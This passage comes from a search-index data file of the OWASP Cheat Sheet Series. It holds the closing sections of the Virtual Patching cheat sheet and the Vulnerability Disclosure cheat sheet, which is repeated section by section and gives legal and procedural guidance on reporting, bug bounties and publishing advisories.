Patches"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#automated-virtual-patch-creation","text":"Manual patch creation may become unfeasible as the number of vulnerabilities grow and automated means may become necessary. If the vulnerabilities were identified using automated tools and an XML report is available, it is possible to leverage automated processes to auto-convert this vulnerability data into virtual patches for protection systems. Three examples include: OWASP ModSecurity Core Rule Set (CRS) Scripts - The OWASP CRS includes scripts to auto-convert XML output from tools such as [OWASP ZAP into ModSecurity Virtual Patches]. Reference here . ThreadFix Virtual Patching - ThreadFix also includes automated processes of converting imported vulnerability XML data into virtual patches for security tools such as ModSecurity. Reference here . Direct Importing to WAF Device - Many commercial WAF products have the capability to import DAST tool XML report data and automatically adjust their protection profiles.","title":"Automated Virtual Patch Creation"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#implementationtesting-phase","text":"In order to accurately test out the newly created virtual patches, it may be necessary to use an application other than a web browser. Some useful tools are: Web browser. Command-line web clients such as Curl and Wget. Local Proxy Servers such as OWASP ZAP . ModSecurity AuditViewer \u2013 which allows you to load a ModSecurity audit log file, manipulate it and then re-inject the data back into any web server.","title":"Implementation/Testing Phase"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#testing-steps","text":"Implement virtual patches initially in a \"Log Only\" configuration to ensure that you do not block any normal user traffic (false positives). If the vulnerability was identified by a specific tool or assessment team - request a retest. If retesting fails due to evasions, then you must go back to the Analysis phase to identify how to better fix the issue.","title":"Testing Steps"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#recoveryfollow-up-phase","text":"Update Data in Ticket System - Although you may need to expedite the implementation of virtual patches, you should still track them in your normal Patch Management processes. This means that you should create proper change request tickets, etc\u2026 so that their existence and functionality is documented. Updating the ticket system also helps to identify \"time-to-fix\" metrics for different vulnerability types. Make sure to properly log the virtual patch rule ID values. Periodic Re-assessments - You should also have periodic re-assessments to verify if/when you can remove previous virtual patches if the web application code has been updated with the real source code fix. I have found that many people opt to keep virtual patches in place due to better identification/logging vs. application or db capabilities. Running Virtual Patch Alert Reports - Run reports to identify if/when any of your virtual patches have triggered. This will show value for virtual patching in relation to windows of exposure for source code time-to-fix.","title":"Recovery/Follow-Up Phase"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#references","text":"OWASP Virtual Patching Best Practices . OWASP Securing WebGoat with ModSecurity .","title":"References"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html","text":"Vulnerability Disclosure Cheat Sheet \u00b6 Introduction \u00b6 This cheat sheet is intended to provide guidance on the vulnerability disclosure process for both security researchers and organisations. This is an area where collaboration is extremely important, but that can often result in conflict between the two parties. Researchers should: Ensure that any testing is legal and authorised. Respect the privacy of others. Make reasonable efforts to contact the security team of the organisation. Provide sufficient details to allow the vulnerabilities to be verified and reproduced. Not demand payment or rewards for reporting vulnerabilities outside of an established bug bounty program. Organisations should: Provide a clear method for researchers to securely report vulnerabilities. Clearly establish the scope and terms of any bug bounty programs. Respond to reports in a reasonable timeline. Communicate openly with researchers. Not threaten legal action against researchers. Request CVEs where appropriate. Publish clear security advisories and changelogs. Offer rewards and credit. Methods of Disclosure \u00b6 There are a number of different models that can be be followed when disclosing vulnerabilities, which are listed in the sections below. Private Disclosure \u00b6 In the private disclosure model, the vulnerability is reported privately to the organisation. The organisation may choose to publish the details of the vulnerabilities, but this is done at the discretion of the organisation, not the researcher, meaning that many vulnerabilities may never be made public. The majority of bug bounty programs require that the researcher follows this model. The main problem with this model is that if the vendor is unresponsive, or decides not to fix the vulnerability, then the details may never be made public. Historically this has lead to researchers getting fed up with companies ignoring and trying to hide vulnerabilities, leading them to the full disclosure approach. Full Disclosure \u00b6 With the full disclosure approach, the full details of the vulnerability are made public as soon as they are identified. This means that the full details (sometimes including exploit code) are available to attackers, often before a patch is available. The full disclosure approach is primarily used in response or organisations ignoring reported vulnerabilities, in order to put pressure on them to develop and publish a fix. This makes the full disclosure approach very controversial, and it is seen as irresponsible by many people. Generally it should only be considered as a last resort, when all other methods have failed, or when exploit code is already publicly available. Responsible or Coordinated Disclosure \u00b6 Responsible disclosure attempts to find a reasonable middle ground between these two approaches. With responsible disclosure, the initial report is made privately, but with the full details being published once a patch has been made available (sometimes with a delay to allow more time for the patches to be installed). In many cases, the researcher also provides a deadline for the organisation to respond to the report, or to provide a patch. If this deadline is not met, then the researcher may adopt the full disclosure approach, and publish the full details. Google's Project Zero adopts a similar approach, where the full details of the vulnerability are published after 90 days regardless of whether or not the organisation has published a patch. Reporting Vulnerabilities \u00b6 This section is intended to provide guidance for security researchers on how to report vulnerabilities to organisations. Warnings and Legality \u00b6 Before carrying out any security research or reporting vulnerabilities, ensure that you know and understand the laws in your jurisdiction . This cheat sheet does not constitute legal advice, and should not be taken as such. . The following points highlight a number of areas that should be considered: If you are carrying out testing under a bug bounty or similar program, the organisation may have established safe harbor policies, that allow you to legally carry out testing, as long as you stay within the scope and rules of their program . Make sure that you read the scope carefully - stepping outside of the scope and rules may be a criminal offence. Some countries have laws restricting reverse engineering, so testing against locally installed software may not be permitted. Do not demand payment or other rewards as a condition of providing information on security vulnerabilities, or in exchange for not publishing the details or reporting them to industry regulators, as this may constitute blackmail. If you receive bug bounty payments, these are generally considered as income, meaning that they may be taxable. Reporting this income and ensuring that you pay the appropriate tax on it is your responsibility. If you find vulnerabilities as part of your work, or on equipment owned by your employer, your employer may prevent you from reporting these or claiming a bug bounty. Read your contract carefully and consider taking legal advice before doing so. Finding Contact Details \u00b6 The first step in reporting a vulnerability is finding the appropriate person to report it to. Although some organisations have clearly published disclosure policies, many do not, so it can be difficult to find the correct place to report the issue. Where there is no clear disclosure policy, the following areas may provide contact details: Bug bounty programs such as BugCrowd , HackerOne or Open Bug Bounty . A security.txt file on the website at /security.txt or /.well-known/security.txt . An existing issue tracking system. Generic email addresses such as security@ or abuse@ . The generic \"Contact Us\" page on the website. Social media platforms. Phoning the organisation. Reaching out to the community. When reaching out to people who are not dedicated security contacts, request the details for a relevant member of staff, rather than disclosing the vulnerability details to whoever accepts the initial contact (especially over social media). If it is not possible to contact the organisation directly, a national or sector-based CERT may be able to assist. Initial Report \u00b6 Once a security contact has been identified, an initial report should be made of the details of the vulnerability. Ideally this should be done over an encrypted channel (such as the use of PGP keys), although many organisations do not support this. The initial report should include: Sufficient details of the vulnerability to allow it to be understood and reproduced. HTTP requests and responses, HTML snippets, screenshots or any other supporting evidence. Redact any personal data before reporting. Some organisations may try and claim vulnerabilities never existed, so ensure you have sufficient evidence to prove that they did. Proof of concept code (if available). The impact of the vulnerability. Any references or further reading that may be appropriate. In many cases, especially in smaller organisations, the security reports may be handled by developers or IT staff who do not have a security background. This means that they may not be familiar with many security concepts or terminology, so reports should be written in clear and simple terms. It may also be beneficial to provide a recommendation on how the issue could be mitigated or resolved. However, unless the details of the system or application are known, or you are very confident in the recommendation then it may be better to point the developers to some more general guidance (such as an OWASP cheat sheet). If you are planning to publish the details of the vulnerability after a period of time (as per some responsible disclosure policies), then this should be clearly communicated in the initial email - but try to do so in a tone that doesn't sound threatening to the recipient. If the organisation does not have an established bug bounty program, then avoid asking about payments or rewards in the initial contact - leave it until the issue has been acknowledged (or ideally fixed). In particular, do not demand payment before revealing the details of the vulnerability . At best this will look like an attempt to scam the company, at worst it may constitute blackmail. Ongoing Communication \u00b6 While simpler vulnerabilities might be resolved solely from the initial report, in many cases there will be a number of emails back and forth between the researcher and the organisation. Especially for more complex vulnerabilities, the developers or administrators may ask for additional information or recommendations on how to resolve the issue. They may also ask for assistance in retesting the issue once a fix has been implemented. Although there is no obligation to carry out this retesting, as long as the request is reasonable then and providing feedback on the fixes is very beneficial. It may also be necessary to chase up the organisation if they become unresponsive, or if the established deadline for publicly disclosing the vulnerability is approaching. Ensure that this communication stays professional and positive - if the disclosure process becomes hostile then neither party will benefit. Be patient if it's taking a while for the issue to be resolved. The developers may be under significant pressure from different people within the organisation, and may not be able to be fully open in their communication. Triaging, developing, reviewing, testing and deploying a fix within in an enterprise environment takes significantly more time than most researchers expect, and being constantly hassled for updates just adds another level of pressure on the developers. When to Give Up \u00b6 Despite every effort that you make, some organisations are not interested in security, are impossible to contact, or may be actively hostile to researchers disclosing vulnerabilities. In some cases they may even threaten to take legal action against researchers. When this happens it is very disheartening for the researcher - it is important not to take this personally. When this happens, there are a number of options that can be taken. Publicly disclose the vulnerability, and deal with any negative reaction and potentially even a lawsuit. Whether or not they have a strong legal case is irrelevant - they have expensive lawyers and fighting any kind of legal action is expensive and time consuming. Before going down this route, ask yourself is it really worth it? Anonymously disclose the vulnerability. However, if you've already made contact with the organisation and tried to report the vulnerability to them, it may be pretty obvious who's responsible behind the disclosure. If you are going to take this approach, ensure that you have taken sufficient operational security measures to protect yourself. Report the vulnerability to a third party, such as an industry regulator or data protection authority. Move on. There are many organisations who have a genuine interest in security, and are very open and co-operative with security researchers. Unless the vulnerability is extremely serious, it is not worth burning yourself out, or risking your career and livelihood over an organisation who doesn't care . Publishing \u00b6 Once a vulnerability has been patched (or not), then a decision needs to be made about publishing the details. This should ideally be done through discussion with the vendor, and at a minimum the vendor should be notified that you intend to publish, and provided with a link to the published details. The disclosure would typically include: A high level summary of the vulnerability and its impact. Details of which version(s) are vulnerable, and which are fixed. Technical details or potentially proof of concept code. Mitigations or workarounds. Links to the vendor's published advisory. The timeline for the discovery, vendor communication and release. Some organisations may request that you do not publish the details at all, or that you delay publication to allow more time to their users to install security patches. In the interest of maintaining a positive relationship with the organisation, it is worth trying to find a compromise position on this. Whether to publish working proof of concept (or functional exploit code) is a subject of debate. Some people will view this as a \"blackhat\" move, and will argue that by doing so you are directly helping criminals compromise their users. On the other hand, the code can be used to both system administrators and penetration testers to test their systems, and attackers will be able to develop or reverse engineering working exploit code if the vulnerability is sufficiently valuable. If you are publishing the details in hostile circumstances (such as an unresponsive organisation, or after a stated period of time has elapsed) then you may face threats and even legal action. Whether there is any legal basis for this will depend on your jurisdiction, and whether you signed any form of non-disclosure agreement with the organisation. Make sure you understand your legal position before doing so. Note that many bug bounty programs forbid researchers from publishing the details without the agreement of the organisation. If you choose to do so, you may forfeit the bounty or be banned from the platform - so read the rules of the program before publishing. Receiving Vulnerability Reports \u00b6 This section is intended to provide guidance for organisations on how to accept and receive vulnerability reports. Bug Bounty Programs \u00b6 Bug bounty programs incentivise researchers to identify and report vulnerabilities to organisations by offering rewards. These are usually monetary, but can also be physical items (swag). The process is often managed through a third party such as BugCrowd or HackerOne , who provide mediation between researchers and organisations. When implementing a bug bounty program, the following areas need to be clearly defined: Which systems and applications are in scope. Live systems or a staging/UAT environment? Excluding systems managed or owned by third parties. Which types of vulnerabilities are eligible for bounties (SSL/TLS issues? Missing HTTP security headers? Version disclosure?) Legal provisions such as safe harbor policies. The disclose.io project provides some example policies. Take legal advice from lawyers, not from this cheat sheet . How much to offer for bounties, and how is the decision made. The program could get very expensive if a large number of vulnerabilities are identified. Too little and researchers may not bother with the program. The timeline for the initial response, confirmation, payout and issue resolution. When to Implement a Bug Bounty Program \u00b6 Bug bounty have been adopted by many large organisations such as Microsoft, and are starting to be used outside of the commercial sector, including the US Department of Defense. However, for smaller organisations they can bring significant challenges, and require a substantial investment of time and resources. These challenges can include: Having sufficient time and resources to respond to reports. Having sufficiently skilled staff to effectively triage reports. Reports may include a large number of junk or false positives. Managed bug bounty programs may help by performing initial triage (at a cost). Dealing with large numbers of false positives and junk reports. The impact of individuals testing live systems (including unskilled attackers running automated tools they don't understand). Being unable to differentiate between legitimate testing traffic and malicious attacks. Researchers going out of scope and testing systems that they shouldn't. The financial cost of running the program (some companies pay out hundreds of thousands of dollars a year in bounties). Dealing with researchers who are unhappy with how the program is run (such as disputing bounty amounts, or being angry when reported issues are duplicates or out of scope). Despite these potential issues, bug bounty programs are a great way to identify vulnerabilities in applications and systems. However, they should only be used by organisations that already have a mature vulnerability disclosure process, supported by strong internal processes to resolve vulnerabilities. Publishing Contact Details \u00b6 The most important step in the process is providing a way for security researchers to contact your organisation. The easier it is for them to do so, the more likely it is that you'll receive security reports. The following list includes some of the common mechanisms that are used for this - the more of these that you can implement the better: A dedicated security contact on the \"Contact Us\" page. Dedicated instructions for reporting security issues on a bug tracker. The common security@ email address. A security.txt file on the website at /security.txt or /.well-known/security.txt . Using third party bug bounty program. It is also important to ensure that frontline staff (such as those who monitor the main contact address, web chat and phone lines) are aware of how to handle reports of security issues, and who to escalate these reports to within the organisation. Providing Reporting Guidelines \u00b6 Alongside the contact details, it is also good to provide some guidelines for researchers to follow when reporting vulnerabilities. These could include: Requesting specific information that may help in confirming and resolving the issue. Using specific categories or marking the issue as confidential on a bug tracker. Providing PGP keys for encrypted communication. Establishing a timeline for an initial response and triage. Establishing safe harbor provisions. Communicating With Researchers \u00b6 Communication between researchers and organisations is often one of the hardest points of the vulnerability disclosure process, and can easily leave both sides frustrated and unhappy with the process. The outline below provides an example of the ideal communication process: Respond to the initial request for contact details with a clear mechanism for the researcher to provide additional information. Acknowledge the vulnerability details and provide a timeline to carry out triage. Request additional clarification or details if required. Confirm the vulnerability and provide a timeline for implementing a fix. Confirm the details of any reward or bounty offered. If required, request the researcher to retest the vulnerability. Confirm that the vulnerability has been resolved. Throughout the process, provide regular updates of the current status, and the expected timeline to triage and fix the vulnerability. Even if there is no firm timeline for these, the ongoing communication provides some reassurance that the vulnerability hasn't been forgotten about. Researchers Demanding Payment \u00b6 Some individuals may approach an organisation claiming to have found a vulnerability, and demanding payment before sharing the details. Although these requests may be legitimate, in many cases they are simply scams. One option is to request that they carry out the disclosure through a mediated bug bounty platform, which can provide a level of protection for both sides, as scammers are unlikely to be willing to use these platforms. Disclosure \u00b6 Commercial and Open Source Software \u00b6 Once the vulnerability has been resolved (and retested), the details should be published in a security advisory for the software. It is important to remember that publishing the details of security issues does not make the vendor look bad . All software has security vulnerabilities, and demonstrating a clear and established process for handling and disclosing them gives far more confidence in the security of the software than trying to hide the issues. At a minimum, the security advisory must contain: A high level summary of the vulnerability, including the impact. A clear list of vulnerable versions. A clear list of patch versions. Any caveats on when the software is vulnerable (for example, if only certain configurations are affected). Any workarounds or mitigation that can be implemented as a temporary fix. A CVE for the vulnerability. Where possible it is also good to include: The timeline of the vulnerability disclosure process. Credit for the researcher who identified the vulnerability. Technical details of the vulnerability. IDS/IPS signatures or other indicators of compromise. Security advisories should be easy for developers and system administrators to find. Common ways to publish them include: A dedicated \"security\" or \"security advisories\" page on the website. A security mailing list or forum. Linked from the main changelogs and release notes. Some researchers may publish their own technical write ups of the vulnerability, which will usually include the full details required to exploit it (and sometimes even working exploit code). For more serious vulnerabilities, it may be sensible to ask the researcher to delay publishing the full details for a period of time (such as a week), in order to give system administrators more time to install the patches before exploit code is available. However, once the patch has been releases, attackers will be able to reverse engineer the vulnerability and develop their own exploit code, so there is limited value to delaying the full release. Private Systems \u00b6 For vulnerabilities in private systems, a decision needs to be made about whether the details should be published once the vulnerability has been resolved. Most bug bounty programs give organisations the option about whether to disclose the details once the issue has been resolved, although it is not typically required. Publishing these details helps to demonstrate that that the organisation is taking proactive and transparent approach to security, but can also result in potentially embarrassing omissions and misconfigurations being made public. In the event of a future compromise or data breach, they could also potentially be used as evidence of a weak security culture within the organisation. Additionally, they may expose technical details about internal, and could help attackers identify other similar issues. As such, this decision should be carefully evaluated, and it may be wise to take legal advice. Rewarding Researchers \u00b6 Where researchers have identified and reported vulnerabilities outside of a bug bounty program (essentially providing free security testing), and have acted professionally and helpfully throughout the vulnerability disclosure process, it is good to offer them some kind of reward to encourage this kind of positive interaction in future. If monetary rewards are not possible then a number of other options should be considered, such as: Discounts or credit for services or products offered by the organisation. Virtual rewards (such as special in-game items, custom avatars, etc). T-shirts, stickers and other branded items (swag). Credit in a \"hall of fame\", or other similar acknowledgement. Further Reading \u00b6 The CERT Guide to Coordinated Vulnerability Disclosure HackerOne's Vulnerability Disclosure Guidelines Disclose.io's Vulnerability Disclosure Terms","title":"Vulnerability Disclosure"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#vulnerability-disclosure-cheat-sheet","text":"","title":"Vulnerability Disclosure Cheat Sheet"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#introduction","text":"This cheat sheet is intended to provide guidance on the vulnerability disclosure process for both security researchers and organisations. This is an area where collaboration is extremely important, but that can often result in conflict between the two parties. Researchers should: Ensure that any testing is legal and authorised. Respect the privacy of others. Make reasonable efforts to contact the security team of the organisation. Provide sufficient details to allow the vulnerabilities to be verified and reproduced. Not demand payment or rewards for reporting vulnerabilities outside of an established bug bounty program. Organisations should: Provide a clear method for researchers to securely report vulnerabilities. Clearly establish the scope and terms of any bug bounty programs. Respond to reports in a reasonable timeline. Communicate openly with researchers. Not threaten legal action against researchers. Request CVEs where appropriate. Publish clear security advisories and changelogs. Offer rewards and credit.","title":"Introduction"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#methods-of-disclosure","text":"There are a number of different models that can be be followed when disclosing vulnerabilities, which are listed in the sections below.","title":"Methods of Disclosure"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#private-disclosure","text":"In the private disclosure model, the vulnerability is reported privately to the organisation. The organisation may choose to publish the details of the vulnerabilities, but this is done at the discretion of the organisation, not the researcher, meaning that many vulnerabilities may never be made public. The majority of bug bounty programs require that the researcher follows this model. The main problem with this model is that if the vendor is unresponsive, or decides not to fix the vulnerability, then the details may never be made public. Historically this has lead to researchers getting fed up with companies ignoring and trying to hide vulnerabilities, leading them to the full disclosure approach.","title":"Private Disclosure"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#full-disclosure","text":"With the full disclosure approach, the full details of the vulnerability are made public as soon as they are identified. This means that the full details (sometimes including exploit code) are available to attackers, often before a patch is available. The full disclosure approach is primarily used in response or organisations ignoring reported vulnerabilities, in order to put pressure on them to develop and publish a fix. This makes the full disclosure approach very controversial, and it is seen as irresponsible by many people. Generally it should only be considered as a last resort, when all other methods have failed, or when exploit code is already publicly available.","title":"Full Disclosure"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#responsible-or-coordinated-disclosure","text":"Responsible disclosure attempts to find a reasonable middle ground between these two approaches. With responsible disclosure, the initial report is made privately, but with the full details being published once a patch has been made available (sometimes with a delay to allow more time for the patches to be installed). In many cases, the researcher also provides a deadline for the organisation to respond to the report, or to provide a patch. If this deadline is not met, then the researcher may adopt the full disclosure approach, and publish the full details. Google's Project Zero adopts a similar approach, where the full details of the vulnerability are published after 90 days regardless of whether or not the organisation has published a patch.","title":"Responsible or Coordinated Disclosure"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#reporting-vulnerabilities","text":"This section is intended to provide guidance for security researchers on how to report vulnerabilities to organisations.","title":"Reporting Vulnerabilities"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#warnings-and-legality","text":"Before carrying out any security research or reporting vulnerabilities, ensure that you know and understand the laws in your jurisdiction . This cheat sheet does not constitute legal advice, and should not be taken as such. . The following points highlight a number of areas that should be considered: If you are carrying out testing under a bug bounty or similar program, the organisation may have established safe harbor policies, that allow you to legally carry out testing, as long as you stay within the scope and rules of their program . Make sure that you read the scope carefully - stepping outside of the scope and rules may be a criminal offence. Some countries have laws restricting reverse engineering, so testing against locally installed software may not be permitted. Do not demand payment or other rewards as a condition of providing information on security vulnerabilities, or in exchange for not publishing the details or reporting them to industry regulators, as this may constitute blackmail. If you receive bug bounty payments, these are generally considered as income, meaning that they may be taxable. Reporting this income and ensuring that you pay the appropriate tax on it is your responsibility. If you find vulnerabilities as part of your work, or on equipment owned by your employer, your employer may prevent you from reporting these or claiming a bug bounty. Read your contract carefully and consider taking legal advice before doing so.","title":"Warnings and Legality"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#finding-contact-details","text":"The first step in reporting a vulnerability is finding the appropriate person to report it to. Although some organisations have clearly published disclosure policies, many do not, so it can be difficult to find the correct place to report the issue. Where there is no clear disclosure policy, the following areas may provide contact details: Bug bounty programs such as BugCrowd , HackerOne or Open Bug Bounty . A security.txt file on the website at /security.txt or /.well-known/security.txt . An existing issue tracking system. Generic email addresses such as security@ or abuse@ . The generic \"Contact Us\" page on the website. Social media platforms. Phoning the organisation. Reaching out to the community. When reaching out to people who are not dedicated security contacts, request the details for a relevant member of staff, rather than disclosing the vulnerability details to whoever accepts the initial contact (especially over social media). If it is not possible to contact the organisation directly, a national or sector-based CERT may be able to assist.","title":"Finding Contact Details"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#initial-report","text":"Once a security contact has been identified, an initial report should be made of the details of the vulnerability. Ideally this should be done over an encrypted channel (such as the use of PGP keys), although many organisations do not support this. The initial report should include: Sufficient details of the vulnerability to allow it to be understood and reproduced. HTTP requests and responses, HTML snippets, screenshots or any other supporting evidence. Redact any personal data before reporting. Some organisations may try and claim vulnerabilities never existed, so ensure you have sufficient evidence to prove that they did. Proof of concept code (if available). The impact of the vulnerability. Any references or further reading that may be appropriate. In many cases, especially in smaller organisations, the security reports may be handled by developers or IT staff who do not have a security background. This means that they may not be familiar with many security concepts or terminology, so reports should be written in clear and simple terms. It may also be beneficial to provide a recommendation on how the issue could be mitigated or resolved. However, unless the details of the system or application are known, or you are very confident in the recommendation then it may be better to point the developers to some more general guidance (such as an OWASP cheat sheet). If you are planning to publish the details of the vulnerability after a period of time (as per some responsible disclosure policies), then this should be clearly communicated in the initial email - but try to do so in a tone that doesn't sound threatening to the recipient. If the organisation does not have an established bug bounty program, then avoid asking about payments or rewards in the initial contact - leave it until the issue has been acknowledged (or ideally fixed). In particular, do not demand payment before revealing the details of the vulnerability . At best this will look like an attempt to scam the company, at worst it may constitute blackmail.","title":"Initial Report"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#ongoing-communication","text":"While simpler vulnerabilities might be resolved solely from the initial report, in many cases there will be a number of emails back and forth between the researcher and the organisation. Especially for more complex vulnerabilities, the developers or administrators may ask for additional information or recommendations on how to resolve the issue. They may also ask for assistance in retesting the issue once a fix has been implemented. Although there is no obligation to carry out this retesting, as long as the request is reasonable then and providing feedback on the fixes is very beneficial. It may also be necessary to chase up the organisation if they become unresponsive, or if the established deadline for publicly disclosing the vulnerability is approaching. Ensure that this communication stays professional and positive - if the disclosure process becomes hostile then neither party will benefit. Be patient if it's taking a while for the issue to be resolved. The developers may be under significant pressure from different people within the organisation, and may not be able to be fully open in their communication. Triaging, developing, reviewing, testing and deploying a fix within in an enterprise environment takes significantly more time than most researchers expect, and being constantly hassled for updates just adds another level of pressure on the developers.","title":"Ongoing Communication"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#when-to-give-up","text":"Despite every effort that you make, some organisations are not interested in security, are impossible to contact, or may be actively hostile to researchers disclosing vulnerabilities. In some cases they may even threaten to take legal action against researchers. When this happens it is very disheartening for the researcher - it is important not to take this personally. When this happens, there are a number of options that can be taken. Publicly disclose the vulnerability, and deal with any negative reaction and potentially even a lawsuit. Whether or not they have a strong legal case is irrelevant - they have expensive lawyers and fighting any kind of legal action is expensive and time consuming. Before going down this route, ask yourself is it really worth it? Anonymously disclose the vulnerability. However, if you've already made contact with the organisation and tried to report the vulnerability to them, it may be pretty obvious who's responsible behind the disclosure. If you are going to take this approach, ensure that you have taken sufficient operational security measures to protect yourself. Report the vulnerability to a third party, such as an industry regulator or data protection authority. Move on. There are many organisations who have a genuine interest in security, and are very open and co-operative with security researchers. Unless the vulnerability is extremely serious, it is not worth burning yourself out, or risking your career and livelihood over an organisation who doesn't care .","title":"When to Give Up"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#publishing","text":"Once a vulnerability has been patched (or not), then a decision needs to be made about publishing the details. This should ideally be done through discussion with the vendor, and at a minimum the vendor should be notified that you intend to publish, and provided with a link to the published details. The disclosure would typically include: A high level summary of the vulnerability and its impact. Details of which version(s) are vulnerable, and which are fixed. Technical details or potentially proof of concept code. Mitigations or workarounds. Links to the vendor's published advisory. The timeline for the discovery, vendor communication and release. Some organisations may request that you do not publish the details at all, or that you delay publication to allow more time to their users to install security patches. In the interest of maintaining a positive relationship with the organisation, it is worth trying to find a compromise position on this. Whether to publish working proof of concept (or functional exploit code) is a subject of debate. Some people will view this as a \"blackhat\" move, and will argue that by doing so you are directly helping criminals compromise their users. On the other hand, the code can be used to both system administrators and penetration testers to test their systems, and attackers will be able to develop or reverse engineering working exploit code if the vulnerability is sufficiently valuable. If you are publishing the details in hostile circumstances (such as an unresponsive organisation, or after a stated period of time has elapsed) then you may face threats and even legal action. Whether there is any legal basis for this will depend on your jurisdiction, and whether you signed any form of non-disclosure agreement with the organisation. Make sure you understand your legal position before doing so. Note that many bug bounty programs forbid researchers from publishing the details without the agreement of the organisation. If you choose to do so, you may forfeit the bounty or be banned from the platform - so read the rules of the program before publishing.","title":"Publishing"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#receiving-vulnerability-reports","text":"This section is intended to provide guidance for organisations on how to accept and receive vulnerability reports.","title":"Receiving Vulnerability Reports"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#bug-bounty-programs","text":"Bug bounty programs incentivise researchers to identify and report vulnerabilities to organisations by offering rewards. These are usually monetary, but can also be physical items (swag). The process is often managed through a third party such as BugCrowd or HackerOne , who provide mediation between researchers and organisations. When implementing a bug bounty program, the following areas need to be clearly defined: Which systems and applications are in scope. Live systems or a staging/UAT environment? Excluding systems managed or owned by third parties. Which types of vulnerabilities are eligible for bounties (SSL/TLS issues? Missing HTTP security headers? Version disclosure?) Legal provisions such as safe harbor policies. The disclose.io project provides some example policies. Take legal advice from lawyers, not from this cheat sheet . How much to offer for bounties, and how is the decision made. The program could get very expensive if a large number of vulnerabilities are identified. Too little and researchers may not bother with the program. The timeline for the initial response, confirmation, payout and issue resolution.","title":"Bug Bounty Programs"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#when-to-implement-a-bug-bounty-program","text":"Bug bounty have been adopted by many large organisations such as Microsoft, and are starting to be used outside of the commercial sector, including the US Department of Defense. However, for smaller organisations they can bring significant challenges, and require a substantial investment of time and resources. These challenges can include: Having sufficient time and resources to respond to reports. Having sufficiently skilled staff to effectively triage reports. Reports may include a large number of junk or false positives. Managed bug bounty programs may help by performing initial triage (at a cost). Dealing with large numbers of false positives and junk reports. The impact of individuals testing live systems (including unskilled attackers running automated tools they don't understand). Being unable to differentiate between legitimate testing traffic and malicious attacks. Researchers going out of scope and testing systems that they shouldn't. The financial cost of running the program (some companies pay out hundreds of thousands of dollars a year in bounties). Dealing with researchers who are unhappy with how the program is run (such as disputing bounty amounts, or being angry when reported issues are duplicates or out of scope). Despite these potential issues, bug bounty programs are a great way to identify vulnerabilities in applications and systems. However, they should only be used by organisations that already have a mature vulnerability disclosure process, supported by strong internal processes to resolve vulnerabilities.","title":"When to Implement a Bug Bounty Program"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#publishing-contact-details","text":"The most important step in the process is providing a way for security researchers to contact your organisation. The easier it is for them to do so, the more likely it is that you'll receive security reports. The following list includes some of the common mechanisms that are used for this - the more of these that you can implement the better: A dedicated security contact on the \"Contact Us\" page. Dedicated instructions for reporting security issues on a bug tracker. The common security@ email address. A security.txt file on the website at /security.txt or /.well-known/security.txt . Using third party bug bounty program. It is also important to ensure that frontline staff (such as those who monitor the main contact address, web chat and phone lines) are aware of how to handle reports of security issues, and who to escalate these reports to within the organisation.","title":"Publishing Contact Details"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#providing-reporting-guidelines","text":"Alongside the contact details, it is also good to provide some guidelines for researchers to follow when reporting vulnerabilities. These could include: Requesting specific information that may help in confirming and resolving the issue. Using specific categories or marking the issue as confidential on a bug tracker. Providing PGP keys for encrypted communication. Establishing a timeline for an initial response and triage. Establishing safe harbor provisions.","title":"Providing Reporting Guidelines"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#communicating-with-researchers","text":"Communication between researchers and organisations is often one of the hardest points of the vulnerability disclosure process, and can easily leave both sides frustrated and unhappy with the process. The outline below provides an example of the ideal communication process: Respond to the initial request for contact details with a clear mechanism for the researcher to provide additional information. Acknowledge the vulnerability details and provide a timeline to carry out triage. Request additional clarification or details if required. Confirm the vulnerability and provide a timeline for implementing a fix. Confirm the details of any reward or bounty offered. If required, request the researcher to retest the vulnerability. Confirm that the vulnerability has been resolved. Throughout the process, provide regular updates of the current status, and the expected timeline to triage and fix the vulnerability. Even if there is no firm timeline for these, the ongoing communication provides some reassurance that the vulnerability hasn't been forgotten about.","title":"Communicating With Researchers"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#researchers-demanding-payment","text":"Some individuals may approach an organisation claiming to have found a vulnerability, and demanding payment before sharing the details. Although these requests may be legitimate, in many cases they are simply scams. One option is to request that they carry out the disclosure through a mediated bug bounty platform, which can provide a level of protection for both sides, as scammers are unlikely to be willing to use these platforms.","title":"Researchers Demanding Payment"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#disclosure","text":"","title":"Disclosure"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#commercial-and-open-source-software","text":"Once the vulnerability has been resolved (and retested), the details should be published in a security advisory for the software. It is important to remember that publishing the details of security issues does not make the vendor look bad . All software has security vulnerabilities, and demonstrating a clear and established process for handling and disclosing them gives far more confidence in the security of the software than trying to hide the issues. At a minimum, the security advisory must contain: A high level summary of the vulnerability, including the impact. A clear list of vulnerable versions. A clear list of patch versions. Any caveats on when the software is vulnerable (for example, if only 